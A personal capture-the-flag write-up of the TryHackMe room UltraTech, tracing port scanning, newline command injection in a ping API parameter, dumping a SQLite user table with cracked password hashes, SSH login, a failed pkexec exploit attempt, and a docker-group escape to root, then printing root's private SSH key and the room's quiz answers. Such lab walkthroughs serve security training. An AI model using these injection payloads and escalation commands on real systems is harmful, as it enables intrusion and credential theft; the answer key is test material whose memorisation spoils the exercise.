@@ -1,0 +1,552 @@
+Hello, I am dogsploit.py, I will do a writeup on the TryHackMe room UltraTech
+
+
+Let's start by seeing which ports are open in the application with nmap and rustscan
+
+┌──(kali㉿kali)-[~]
+└─$ nmap 10.64.134.143 -A -Pn -p- -T4
+Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-30 14:37 -03
+Nmap scan report for 10.64.134.143
+Host is up (0.22s latency).
+Not shown: 65531 closed tcp ports (reset)
+PORT      STATE SERVICE VERSION
+21/tcp    open  ftp     vsftpd 3.0.5
+22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 6b:57:93:9d:ff:31:f7:c7:82:9c:2d:be:98:d6:29:a8 (RSA)
+|   256 bc:21:a7:9b:6e:9b:1a:13:bb:c5:b8:5c:ad:63:a2:59 (ECDSA)
+|_  256 c8:01:b6:87:b2:8f:d6:24:16:39:3c:4d:06:a4:8d:fb (ED25519)
+8081/tcp  open  http    Node.js Express framework
+|_http-cors: HEAD GET POST PUT DELETE PATCH
+|_http-title: Site doesn't have a title (text/html; charset=utf-8).
+31331/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-title: UltraTech - The best of technology (AI, FinTech, Big Data)
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.95%E=4%D=1/30%OT=21%CT=1%CU=32315%PV=Y%DS=3%DC=T%G=Y%TM=697CF12
+OS:0%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)SEQ
+OS:(SP=103%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=104%GCD=1%ISR=105%TI=Z%
+OS:CI=Z%II=I%TS=A)SEQ(SP=105%GCD=1%ISR=106%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=106%G
+OS:CD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M4E8ST11NW7%O2=M4E8ST11NW7%O3=M4
+OS:E8NNT11NW7%O4=M4E8ST11NW7%O5=M4E8ST11NW7%O6=M4E8ST11)WIN(W1=F4B3%W2=F4B3
+OS:%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M4E8NNSNW7%C
+OS:C=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%
+OS:T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD
+OS:=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S
+OS:=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK
+OS:=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
+
+Network Distance: 3 hops
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 1025/tcp)
+HOP RTT       ADDRESS
+1   215.12 ms 192.168.128.1
+2   ...
+3   218.48 ms 10.64.134.143
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 1195.34 seconds
+
+
+With this information we get the information that the webpage, http its in the port 31331, so we can enumerate the directories with feroxbuster;
+
+┌──(kali㉿kali)-[~]
+└─$ feroxbuster -w ~/Documents/Wordlists/common.txt -u http://10.67.152.58:31331    
+                                                                                                                                                                                            
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben "epi" Risher 🤓                 ver: 2.13.0
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ http://10.67.152.58:31331/
+ 🚩  In-Scope Url          │ 10.67.152.58
+ 🚀  Threads               │ 50
+ 📖  Wordlist              │ /home/kali/Documents/Wordlists/common.txt
+ 👌  Status Codes          │ All Status Codes!
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.13.0
+ 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
+ 🔎  Extract Links         │ true
+ 🏁  HTTP methods          │ [GET]
+ 🔃  Recursion Depth       │ 4
+ 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Management Menu™
+──────────────────────────────────────────────────
+404      GET        9l       31w      277c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+403      GET        9l       28w      280c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+200      GET        1l      396w     8929c http://10.67.152.58:31331/images/undraw_responsive.svg
+200      GET       65l      229w     2534c http://10.67.152.58:31331/what.html
+200      GET        1l      530w    10496c http://10.67.152.58:31331/images/undraw_browser.svg
+200      GET        1l      203w     8500c http://10.67.152.58:31331/images/undraw_designer.svg
+200      GET        1l      661w    19350c http://10.67.152.58:31331/images/undraw_frameworks.svg
+200      GET        1l      178w    19165c http://10.67.152.58:31331/js/app.min.js
+200      GET       37l       86w      883c http://10.67.152.58:31331/js/api.js
+200      GET        1l      327w    11819c http://10.67.152.58:31331/images/undraw_hello_aeia.svg
+200      GET        4l      328w    24710c http://10.67.152.58:31331/css/style.min.css
+200      GET        1l      671w    15018c http://10.67.152.58:31331/images/undraw_design.svg
+200      GET        1l      685w    14849c http://10.67.152.58:31331/images/undraw_elements.svg
+200      GET     1393l     3543w    30017c http://10.67.152.58:31331/css/style.css
+200      GET      206l      773w    77520c http://10.67.152.58:31331/images/evie_default_bg.jpeg
+200      GET        1l      443w    11824c http://10.67.152.58:31331/images/undraw_creation.svg
+200      GET     1463l     4649w    44494c http://10.67.152.58:31331/js/app.js
+200      GET        1l      265w     4599c http://10.67.152.58:31331/images/together.svg
+200      GET        1l      307w     9407c http://10.67.152.58:31331/images/undraw_selfie.svg
+200      GET        1l      677w    14561c http://10.67.152.58:31331/images/undraw_tabs.svg
+200      GET        1l      155w    12953c http://10.67.152.58:31331/images/tet.svg
+200      GET      139l      531w     6092c http://10.67.152.58:31331/index.html
+200      GET        1l      931w    18240c http://10.67.152.58:31331/images/undraw_everywhere.svg
+200      GET      139l      531w     6092c http://10.67.152.58:31331/
+200      GET      240l     1315w   107517c http://10.67.152.58:31331/images/hero_sm.png
+200      GET        1l     1243w    63504c http://10.67.152.58:31331/images/undraw_fans.svg
+301      GET        9l       28w      319c http://10.67.152.58:31331/css => http://10.67.152.58:31331/css/
+200      GET        7l       25w    32412c http://10.67.152.58:31331/favicon.ico
+301      GET        9l       28w      322c http://10.67.152.58:31331/images => http://10.67.152.58:31331/images/
+301      GET        9l       28w      326c http://10.67.152.58:31331/javascript => http://10.67.152.58:31331/javascript/
+301      GET        9l       28w      318c http://10.67.152.58:31331/js => http://10.67.152.58:31331/js/
+200      GET        5l        6w       53c http://10.67.152.58:31331/robots.txt
+301      GET        9l       28w      333c http://10.67.152.58:31331/javascript/jquery => http://10.67.152.58:31331/javascript/jquery/
+200      GET     2543l    10714w   271756c http://10.67.152.58:31331/javascript/jquery/jquery
+301      GET        9l       28w      332c http://10.67.152.58:31331/javascript/async => http://10.67.152.58:31331/javascript/async/
+[##########>---------] - 2m     60667/120823  2m      found:33      errors:162    
+[##########>---------] - 2m     61240/120823  2m      found:33      errors:162    
+🚨 Caught ctrl+c 🚨 saving scan state to ferox-http_10_67_152_58_31331_-1769813513.state ...
+[##########>---------] - 2m     61273/120823  2m      found:33      errors:163    
+[##############>-----] - 2m     21529/30194   151/s   http://10.67.152.58:31331/ 
+[####################] - 8s     30194/30194   3896/s  http://10.67.152.58:31331/images/ => Directory listing (add --scan-dir-listings to scan)
+[####################] - 2s     30194/30194   20116/s http://10.67.152.58:31331/css/ => Directory listing (add --scan-dir-listings to scan)
+[####################] - 2s     30194/30194   15976/s http://10.67.152.58:31331/js/ => Directory listing (add --scan-dir-listings to scan)
+[############>-------] - 2m     18595/30194   149/s   http://10.67.152.58:31331/javascript/ 
+[##########>---------] - 2m     15363/30194   147/s   http://10.67.152.58:31331/javascript/jquery/ 
+[###>----------------] - 46s     5714/30194   124/s   http://10.67.152.58:31331/javascript/async/
+
+
+
+We got the directory /js/api.js, which is VERY suspect, so let's see what's in this page
+
+┌──(kali㉿kali)-[~]
+└─$ curl http://10.67.152.58:31331/js/api.js                                             
+(function() {
+    console.warn('Debugging ::');
+
+    function getAPIURL() {
+        return `${window.location.hostname}:8081`
+    }
+    
+    function checkAPIStatus() {
+        const req = new XMLHttpRequest();
+        try {
+            const url = `http://${getAPIURL()}/ping?ip=${window.location.hostname}`
+            req.open('GET', url, true);
+            req.onload = function (e) {
+                if (req.readyState === 4) {
+                    if (req.status === 200) {
+                        console.log('The api seems to be running')
+                    } else {
+                        console.error(req.statusText);
+                    }
+                }
+            };
+            req.onerror = function (e) {
+                console.error(xhr.statusText);
+            };
+            req.send(null);
+        }
+        catch (e) {
+            console.error(e)
+            console.log('API Error');
+        }
+    }
+    checkAPIStatus()
+    const interval = setInterval(checkAPIStatus, 10000);
+    const form = document.querySelector('form')
+    form.action = `http://${getAPIURL()}/auth`;
+    
+})();
+
+That's good, we discovered that the /auth it's running in 8081, so let's check what is in that /auth;
+
+┌──(kali㉿kali)-[~]
+└─$ curl http://10.67.152.58:8081/auth      
+You must specify a login and a password
+
+ok, there is nothing really good in that subdomain, so let's see what is in the /ping?ip= from the line "const url = `http://${getAPIURL()}/ping?ip=${window.location.hostname}`"
+
+
+┌──(kali㉿kali)-[~]
+└─$ curl http://10.67.152.58:8081/ping?ip=127.0.0.1     
+PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
+64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.046 ms
+
+--- 127.0.0.1 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 0.046/0.046/0.046/0.000 ms
+
+That's promissing, we can maybe try a possible SSRF in that ?ip= parameter, I will do it on my browser, because it will send a ping as it was in my pc if I sent it with curl
+
+http://10.67.152.58:8081/ping?ip=127.0.0.1;whoami
+sent an error of 404 not found from apache
+
+
+http://10.67.152.58:8081/ping?ip=127.0.0.1%0Awhoami returned;
+PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data. 64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.043 ms --- 127.0.0.1 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 0.043/0.043/0.043/0.000 ms www 
+which means we got an RCE from an SSRF, so let's see what is in our directory;
+http://10.67.152.58:8081/ping?ip=127.0.0.1%0Als
+
+that returned;
+PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data. 64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.051 ms --- 127.0.0.1 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 0.051/0.051/0.051/0.000 ms index.js node_modules package.json package-lock.json start.sh utech.db.sqlite 
+
+let's  see this .sqlite archive; utech.db.sqlite with the payload http://10.67.152.58:8081/ping?ip=127.0.0.1%0Acat+utech.db.sqlite
+
+PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data. 64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.048 ms --- 127.0.0.1 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 0.048/0.048/0.048/0.000 ms SQLite format 3@ .,P zz��etableusersusersCREATE TABLE users ( login Varchar, password Varchar, type Int ) ���(r00tf357a0c52799563c7c7b76c1e7543a32)admin0d0ea5111e3c1def594c1684e3b9be84 I dont know what happened, but we goot two possible users and passwords; admin, and r00t, so let's try to get the passwords from the hashes the user admin returned;
+
+
+admin:mrsheafy
+
+and the r00t user returned
+
+r00t:n100906
+
+
+let's try logging in in the /auth with one of these users, so let's use the URL 10.67.152.58:8081/auth?login=r00t&password=n100906 or 10.67.152.58:8081/auth?login=admin&password=mrsheafy
+
+which both return 
+
+Hey r00t, can you please have a look at the server's configuration?
+The intern did it and I don't really trust him.
+Thanks!
+
+lp1
+
+so, it gave us nothing, let's try going on SSH, which we got on the nmap, port 22;
+
+┌──(kali㉿kali)-[~]
+└─$ ssh r00t@10.67.152.58
+r00t@10.67.152.58's password: n100906
+Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-139-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+ System information as of Fri 30 Jan 2026 10:18:13 PM UTC
+
+  System load:  0.24               Processes:             123
+  Usage of /:   41.2% of 19.51GB   Users logged in:       0
+  Memory usage: 54%                IPv4 address for ens5: 10.67.152.58
+  Swap usage:   0%
+
+ * Ubuntu 20.04 LTS Focal Fossa has reached its end of standard support on 31 Ma
+ 
+   For more details see:
+   https://ubuntu.com/20-04
+
+Expanded Security Maintenance for Infrastructure is not enabled.
+
+0 updates can be applied immediately.
+
+80 additional security updates can be applied with ESM Infra.
+Learn more about enabling ESM Infra service for Ubuntu 20.04 at
+https://ubuntu.com/20-04
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Your Hardware Enablement Stack (HWE) is supported until April 2025.
+
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+r00t@ip-10-67-152-58:~$
+
+we got initial access, now we need to escalate privileges to get the ssh certificate and solve the room
+
+
+let's see the users with
+
+r00t@ip-10-67-152-58:~$ cd ..
+r00t@ip-10-67-152-58:/home$ ls
+lp1  r00t  ubuntu  www
+
+So, we got the users ubuntu and lp1,  let's see whats inside
+
+r00t@ip-10-67-152-58:/home/lp1$ ls -lah
+total 36K
+drwxr-xr-x 5 lp1  lp1  4.0K Mar 22  2019 .
+drwxr-xr-x 6 root root 4.0K Oct 26 09:40 ..
+-rw------- 1 lp1  lp1    22 Mar 22  2019 .bash_history
+-rw-r--r-- 1 lp1  lp1   220 Apr  4  2018 .bash_logout
+-rw-r--r-- 1 lp1  lp1  3.7K Apr  4  2018 .bashrc
+drwx------ 2 lp1  lp1  4.0K Mar 19  2019 .cache
+drwx------ 3 lp1  lp1  4.0K Mar 22  2019 .config
+drwx------ 3 lp1  lp1  4.0K Mar 19  2019 .gnupg
+-rw-r--r-- 1 lp1  lp1   807 Apr  4  2018 .profile
+-rw-r--r-- 1 lp1  lp1     0 Mar 19  2019 .sudo_as_admin_successful
+r00t@ip-10-67-152-58:/home/lp1$ cd .sudo_as_admin_successful
+-bash: cd: .sudo_as_admin_successful: Not a directory
+r00t@ip-10-67-152-58:/home/lp1$ cd ..
+r00t@ip-10-67-152-58:/home$ ls
+lp1  r00t  ubuntu  www
+r00t@ip-10-67-152-58:/home$ cd r00t
+r00t@ip-10-67-152-58:~$ ls -lah
+total 24K
+drwxr-xr-x 3 r00t r00t 4.0K Jan 30 22:18 .
+drwxr-xr-x 6 root root 4.0K Oct 26 09:40 ..
+-rw-r--r-- 1 r00t r00t  220 Apr  4  2018 .bash_logout
+-rw-r--r-- 1 r00t r00t 3.7K Apr  4  2018 .bashrc
+drwx------ 2 r00t r00t 4.0K Jan 30 22:18 .cache
+-rw-r--r-- 1 r00t r00t  807 Apr  4  2018 .profile
+r00t@ip-10-67-152-58:~$ cd ,,
+-bash: cd: ,,: No such file or directory
+r00t@ip-10-67-152-58:~$ cd ..
+r00t@ip-10-67-152-58:/home$ cd ubuntu
+r00t@ip-10-67-152-58:/home/ubuntu$ ls -lah
+total 32K
+drwxr-xr-x 4 ubuntu ubuntu 4.0K Oct 26 09:41 .
+drwxr-xr-x 6 root   root   4.0K Oct 26 09:40 ..
+-rw------- 1 ubuntu ubuntu    8 Oct 26 09:41 .bash_history
+-rw-r--r-- 1 ubuntu ubuntu  220 Apr  4  2018 .bash_logout
+-rw-r--r-- 1 ubuntu ubuntu 3.7K Apr  4  2018 .bashrc
+drwx------ 2 ubuntu ubuntu 4.0K Oct 26 09:40 .cache
+-rw-r--r-- 1 ubuntu ubuntu  807 Apr  4  2018 .profile
+drwx------ 2 ubuntu ubuntu 4.0K Oct 26 09:40 .ssh
+-rw-r--r-- 1 ubuntu ubuntu    0 Oct 26 09:40 .sudo_as_admin_successful
+
+thats crazy good, let's see what is inside .ssh
+
+r00t@ip-10-67-152-58:/home/ubuntu$ cd .ssh
+-bash: cd: .ssh: Permission denied
+
+let's see the SUIDs to try privilege escalation;
+
+r00t@ip-10-67-152-58:/home/ubuntu$ find / -perm -4000 -type f 2>/dev/null
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/snapd/snap-confine
+/usr/lib/openssh/ssh-keysign
+/usr/bin/newuidmap
+/usr/bin/chfn
+/usr/bin/newgrp
+/usr/bin/chsh
+/usr/bin/newgidmap
+/usr/bin/passwd
+/usr/bin/pkexec
+/usr/bin/at
+/usr/bin/sudo
+/usr/bin/gpasswd
+/bin/su
+/bin/mount
+/bin/fusermount
+/bin/umount
+/snap/core20/2669/usr/bin/chfn
+/snap/core20/2669/usr/bin/chsh
+/snap/core20/2669/usr/bin/gpasswd
+/snap/core20/2669/usr/bin/mount
+/snap/core20/2669/usr/bin/newgrp
+/snap/core20/2669/usr/bin/passwd
+/snap/core20/2669/usr/bin/su
+/snap/core20/2669/usr/bin/sudo
+/snap/core20/2669/usr/bin/umount
+/snap/core20/2669/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core20/2669/usr/lib/openssh/ssh-keysign
+/snap/core/17247/bin/mount
+/snap/core/17247/bin/ping
+/snap/core/17247/bin/ping6
+/snap/core/17247/bin/su
+/snap/core/17247/bin/umount
+/snap/core/17247/usr/bin/chfn
+/snap/core/17247/usr/bin/chsh
+/snap/core/17247/usr/bin/gpasswd
+/snap/core/17247/usr/bin/newgrp
+/snap/core/17247/usr/bin/passwd
+/snap/core/17247/usr/bin/sudo
+/snap/core/17247/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core/17247/usr/lib/openssh/ssh-keysign
+/snap/core/17247/usr/lib/snapd/snap-confine
+/snap/core/17247/usr/sbin/pppd
+
+ok, we got the /usr/bin/pkexec let's try to execute that proccess
+
+r00t@ip-10-67-152-58:/home/ubuntu$ pkexec /bin/bash
+==== AUTHENTICATING FOR org.freedesktop.policykit.exec ===
+Authentication is needed to run `/bin/bash' as the super user                                                                                                                               
+Multiple identities can be used for authentication:
+ 1.  lp1
+ 2.  Ubuntu (ubuntu)
+Choose identity to authenticate as (1-2): 1
+Password: 
+polkit-agent-helper-1: pam_authenticate failed: Authentication failure
+==== AUTHENTICATION FAILED ===
+Error executing command as another user: Not authorized
+
+ok, that will be useless
+
+let's see what version we are on
+
+r00t@ip-10-67-152-58:/home/ubuntu$ cat /etc/os-release
+NAME="Ubuntu"
+VERSION="20.04.6 LTS (Focal Fossa)"
+ID=ubuntu
+ID_LIKE=debian
+PRETTY_NAME="Ubuntu 20.04.6 LTS"
+VERSION_ID="20.04"
+HOME_URL="https://www.ubuntu.com/"
+SUPPORT_URL="https://help.ubuntu.com/"
+BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
+PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
+VERSION_CODENAME=focal
+UBUNTU_CODENAME=focal
+
+Ubuntu 20.04.6 has a CVE, CVE-2021-4034, which is an exploit that allows privilege escalation via pkexec, let's try to exploit it
+
+
+r00t@ip-10-67-152-58:~$ touch exploit.c
+r00t@ip-10-67-152-58:~$ nano exploit.c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+
+char *shell = 
+"#include <unistd.h>\n"
+"int main() {\n"
+"  setuid(0);\n"
+"  setgid(0);\n"
+"  execl(\"/bin/bash\", \"bash\", NULL);\n"
+"}\n";
+
+int main() {
+  FILE *fp = fopen("shell.c", "w");
+  fprintf(fp, "%s", shell);
+  fclose(fp);
+  system("gcc shell.c -o shell");
+  setenv("PATH", ".", 1);
+  char *args[] = {"pkexec", "shell", NULL};
+  execvp("pkexec", args);
+  return 0;
+}
+r00t@ip-10-67-152-58:~$ gcc exploit.c -o pwnkit
+r00t@ip-10-67-152-58:~$ ./pwnkit
+r00t@ip-10-67-152-58:~$ id
+uid=1001(r00t) gid=1001(r00t) groups=1001(r00t),116(docker)
+
+
+ok, it didnt work, let's try another thing, let's check if we can use docker with docker ps
+r00t@ip-10-67-152-58:~$ docker ps
+CONTAINER ID   IMAGE     COMMAND   CREATED   STATUS    PORTS     NAMES
+
+ok, we can use it, let's try to privilege escalate with that;
+
+r00t@ip-10-67-152-58:~$ docker run -it --rm -v /:/host ubuntu chroot /host /bin/bash
+Unable to find image 'ubuntu:latest' locally
+
+let's see what images we have
+
+r00t@ip-10-67-152-58:~$ docker images
+REPOSITORY   TAG       IMAGE ID       CREATED       SIZE
+bash         latest    495d6437fc1e   6 years ago   15.8MB
+
+that's perfect! we have the bash image, so let's privilege escalate wth that;
+
+r00t@ip-10-67-152-58:~$ docker run -it --rm -v /:/host bash chroot /host /bin/bash
+groups: cannot find name for group ID 11
+To run a command as administrator (user "root"), use "sudo <command>".
+See "man sudo_root" for details.
+
+root@f9494b8fe969:/# id
+uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
+
+YESS we finally got root access, so now we only need to find the root id_rsa
+
+root@f9494b8fe969:~# ls -lah
+total 60K
+drwx------ 10 root root 4.0K Oct 26 09:46 .
+drwxr-xr-x 23 root root 4.0K Jan 30 21:48 ..
+-rw-------  1 root root 1.2K Oct 26 09:53 .bash_history
+-rw-r--r--  1 root root 3.3K Oct 26 09:41 .bashrc
+drwx------  2 root root 4.0K Mar 22  2019 .cache
+drwx------  3 root root 4.0K Oct 26 09:41 .config
+drwx------  3 root root 4.0K Mar 22  2019 .emacs.d
+drwx------  3 root root 4.0K Mar 22  2019 .gnupg
+drwxr-xr-x  5 root root 4.0K Oct 26 09:42 .npm
+drwxr-xr-x  8 root root 4.0K Oct 26 09:41 .nvm
+-rw-r--r--  1 root root  161 Jan  2  2024 .profile
+-rw-------  1 root root    0 Mar 22  2019 .python_history
+drwx------  2 root root 4.0K Oct 26 09:41 .ssh
+-rw-------  1 root root 2.2K Oct 26 09:46 .viminfo
+-rw-rw-rw-  1 root root  193 Mar 22  2019 private.txt
+drwx------  3 root root 4.0K Oct 20 18:22 snap
+we got the .ssh, let's access it 
+
+root@f9494b8fe969:~# cd .ssh
+root@f9494b8fe969:~/.ssh# ls
+authorized_keys  id_rsa  id_rsa.pub
+
+and finally, let's get the certificate to end the room
+
+root@f9494b8fe969:~/.ssh# cat id_rsa
+-----BEGIN RSA PRIVATE KEY-----
+MIIEogIBAAKCAQEAuDSna2F3pO8vMOPJ4l2PwpLFqMpy1SWYaaREhio64iM65HSm
+sIOfoEC+vvs9SRxy8yNBQ2bx2kLYqoZpDJOuTC4Y7VIb+3xeLjhmvtNQGofffkQA
+jSMMlh1MG14fOInXKTRQF8hPBWKB38BPdlNgm7dR5PUGFWni15ucYgCGq1Utc5PP
+NZVxika+pr/U0Ux4620MzJW899lDG6orIoJo739fmMyrQUjKRnp8xXBv/YezoF8D
+hQaP7omtbyo0dczKGkeAVCe6ARh8woiVd2zz5SHDoeZLe1ln4KSbIL3EiMQMzOpc
+jNn7oD+rqmh/ygoXL3yFRAowi+LFdkkS0gqgmwIDAQABAoIBACbTwm5Z7xQu7m2J
+tiYmvoSu10cK1UWkVQn/fAojoKHF90XsaK5QMDdhLlOnNXXRr1Ecn0cLzfLJoE3h
+YwcpodWg6dQsOIW740Yu0Ulr1TiiZzOANfWJ679Akag7IK2UMGwZAMDikfV6nBGD
+wbwZOwXXkEWIeC3PUedMf5wQrFI0mG+mRwWFd06xl6FioC9gIpV4RaZT92nbGfoM
+BWr8KszHw0t7Cp3CT2OBzL2XoMg/NWFU0iBEBg8n8fk67Y59m49xED7VgupK5Ad1
+5neOFdep8rydYbFpVLw8sv96GN5tb/i5KQPC1uO64YuC5ZOyKE30jX4gjAC8rafg
+o1macDECgYEA4fTHFz1uRohrRkZiTGzEp9VUPNonMyKYHi2FaSTU1Vmp6A0vbBWW
+tnuyiubefzK5DyDEf2YdhEE7PJbMBjnCWQJCtOaSCz/RZ7ET9pAMvo4MvTFs3I97
+eDM3HWDdrmrK1hTaOTmvbV8DM9sNqgJVsH24ztLBWRRU4gOsP4a76s0CgYEA0LK/
+/kh/lkReyAurcu7F00fIn1hdTvqa8/wUYq5efHoZg8pba2j7Z8g9GVqKtMnFA0w6
+t1KmELIf55zwFh3i5MmneUJo6gYSXx2AqvWsFtddLljAVKpbLBl6szq4wVejoDye
+lEdFfTHlYaN2ieZADsbgAKs27/q/ZgNqZVI+CQcCgYAO3sYPcHqGZ8nviQhFEU9r
+4C04B/9WbStnqQVDoynilJEK9XsueMk/Xyqj24e/BT6KkVR9MeI1ZvmYBjCNJFX2
+96AeOaJY3S1RzqSKsHY2QDD0boFEjqjIg05YP5y3Ms4AgsTNyU8TOpKCYiMnEhpD
+kDKOYe5Zh24Cpc07LQnG7QKBgCZ1WjYUzBY34TOCGwUiBSiLKOhcU02TluxxPpx0
+v4q2wW7s4m3nubSFTOUYL0ljiT+zU3qm611WRdTbsc6RkVdR5d/NoiHGHqqSeDyI
+6z6GT3CUAFVZ01VMGLVgk91lNgz4PszaWW7ZvAiDI/wDhzhx46Ob6ZLNpWm6JWgo
+gLAPAoGAdCXCHyTfKI/80YMmdp/k11Wj4TQuZ6zgFtUorstRddYAGt8peW3xFqLn
+MrOulVZcSUXnezTs3f8TCsH1Yk/2ue8+GmtlZe/3pHRBW0YJIAaHWg5k2I3hsdAz
+bPB7E9hlrI0AconivYDzfpxfX+vovlP/DdNVub/EO7JSO+RAmqo=
+-----END RSA PRIVATE KEY-----
+
+Answers;
+
+Which software is using the port 8081?
+Node.js
+
+Which other non-standard port is used?
+31331
+
+Which software using this port
+Apache
+
+Which GNU/Linux distribution seems to be used?
+Ubuntu
+
+The software using the port 8081 is a REST api, how many of its routes are used by the web application?
+2
+
+There is a database lying around, what is its filename?
+utech.db.sqlite
+
+What is the first user's password hash?
+f357a0c52799563c7c7b76c1e7543a32
+
+What is the password associated with this hash?
+n100906
+
+What are the first 9 characters of the root user's private SSH key?
+MIIEogIBA
